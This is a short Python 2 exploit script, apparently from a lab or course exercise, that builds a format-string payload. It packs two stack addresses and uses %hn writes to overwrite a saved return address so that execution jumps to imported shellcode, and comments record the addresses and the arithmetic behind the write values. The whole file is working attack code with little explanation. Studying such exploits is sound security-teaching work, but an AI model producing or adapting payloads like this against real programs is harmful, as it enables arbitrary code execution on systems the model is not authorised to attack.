from struct import pack
from shellcode import shellcode

print shellcode + '\x90' + pack("<I", 0xbffe959c) + pack("<I", 0xbffe959e) + "%36208x%10$hn%12910x%11$hn"

#shellcode is at 0xbffe8d98
#0xbffe = 49,150
#0x8d90 = 36,240

#ebp = 0xbffe9598
#ebp+4 = 0xbffe959c
